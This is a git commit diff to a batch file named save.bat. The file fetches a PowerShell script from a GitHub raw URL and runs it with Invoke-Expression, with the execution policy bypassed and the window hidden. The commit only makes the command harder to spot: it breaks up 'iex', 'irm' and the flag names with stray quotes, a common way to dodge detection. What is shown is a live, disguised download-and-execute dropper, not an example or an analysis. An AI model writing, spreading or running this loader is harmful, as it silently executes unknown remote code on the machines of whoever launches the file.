c6e04cacfc7a07e981da1fe55871e714f2fd6c63
C4sp3n-bit <casperautomob@gmail.com>
2026-03-02 14:39:54 +0600

    Update save.bat

--- save.bat
+++ save.bat
@@ -1,5 +1,5 @@
 @echo off
-set "a=iEx (irm "
+set "xx=i"E"x (i"R"m "
 set "b=https://github.com/C4sp3n-bit/tuba/raw/refs/heads/main/savi.ps1)"
-set "c=%a%%b%"
-powershell -NoP -NonI -Exec Bypass -W H -c "%c%"
+set "c=%xx%%b%"
+powershell -nOP -nOni -ep B -""w"" "1" -"C" "%c%"
